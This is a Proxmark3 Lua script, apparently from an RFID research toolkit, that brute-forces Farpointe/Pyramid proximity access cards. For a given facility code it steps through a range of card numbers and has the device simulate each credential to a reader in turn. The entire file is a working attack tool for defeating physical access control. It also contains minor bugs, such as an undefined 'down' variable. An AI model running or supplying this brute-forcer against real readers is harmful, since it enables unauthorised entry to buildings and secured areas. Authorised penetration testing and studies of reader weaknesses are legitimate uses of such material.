
getopt = require('getopt')
bit32 = require('bit32')

usage = [[

USAGE:
script run lf_pyramid_brute -f facility_code -b base_card_number -c count -t timeout -d direction
option		argument		description
------		--------		-----------
-f		0-255			Facility Code: the facility code number
-b		0-65535			Base Card Number: base card number to start from
-c		1-65536			Count: number of cards to try
-t		0-99999, pause		Timeout: timeout between cards (use the word 'pause' to wait for user input)
-d		up, down		Direction: direction to move through card numbers

EXAMPLE: 
script run lf_pyramid_brute -f 10 -b 1000 -c 10 -t 1 -d down
(the above example would start at 10::1000, end at 10::991, and wait 1 second between each card)
]]
desc = [[

  .-----------------------------------------------------------------.
 /  .-.                                                         .-.  \
|  /   \                 lf_pyramid_brute                      /   \  |
| |\_.  |          (bruteforce for pyramid tags)              |    /| |
|\|  | /|                      by                             |\  | |/|
| `---' |                 Kenzy Carey                         | `---' |
|       |                                                     |       |
|       |-----------------------------------------------------|       |
\       |                                                     |       /
 \     /                                                       \     /
  `---'                                                         `---'
]]
	
print(desc)

local function isempty(s)
	return s == nil or s == ''
end

local function main(args)

	for o, a in getopt.getopt(args, 'f:b:c:t:d:h') do
		if o == 'f' then 
			if isempty(a) then 
				print("You did not supply a facility code, using 0")
				facility = 0
			else 
				facility = a
			end
		elseif o == 'b' then 
			if isempty(a) then 
				print("You must supply the flag -b (base id)")
				return
			else
				baseid = a
			end
		elseif o == 'c' then 
			if isempty(a) then 
				print("You must supply the flag -c (count)")
				return
			else
				count = a
			end
		elseif o == 't' then 
			if isempty(a) then 
				print("You did not supply a timeout, using 0")
				timeout = 0
			elseif a == 'pause' then
				print('Pausing enabled, timeout will not be used')
				timeout = 'pause'
			else
				timeout = a
			end
		elseif o == 'd' then 
			if isempty(a) then 
				print("You did not supply a direction, using down")
				direction = down
			else 
				direction = a
			end
		elseif o == 'p' then 
				print("Pausing enabled, timeout will be ignored")
				timeout = 0
				pause = 1
		elseif o == 'h' then
			print(usage)
			return
		end
	end

	if isempty(baseid) then 
		print("You must supply the flag -b (base id)")
		print(usage)
		return
	end

	if isempty(count) then 
		print("You must supply the flag -c (count)")
		print(usage)
		return
	end

	if isempty(facility) then 
		print("Using 0 for the facility code as -f was not supplied")
		facility = 0 
	end
	
	if isempty(timeout) then 
		print("Using 0 for the timeout as -t was not supplied")
		timeout = 0 
	end
	
	if isempty(direction) then 
		print("Using down for direction as -d was not supplied")
		direction = 'down' 
	end
	

	if tonumber(count) > 0 then count = count -1 end
	
	if direction == 'down' then 
		endid = baseid - count
		fordirection = -1
	elseif direction == 'up' then
		endid = baseid + count
		fordirection = 1
	else
		print("Invalid direction (-d) supplied, using down")
		endid = baseid - count
		fordirection = -1
	end
	
	print("")
	print("BruteForcing Farpointe/Pyramid - Facility Code:"..facility..", CardNumber Start:"..baseid..", CardNumber End:"..endid..", TimeOut: "..timeout)
	os.execute("sleep 5")
	for cardnum = baseid,endid,fordirection do 
		--print("Programming Farpointe/Pyramid - Facility Code: "..facility..", CardNumber: "..cardnum.."...")
		core.console('lf pyramid sim '..facility..' '..cardnum..'')
		if timeout == 'pause' then
			print("Press enter to continue ...")
			io.read()
		else
			os.execute("sleep "..timeout.."")
		end
	end
	core.console('hw ping')
end


main(args)
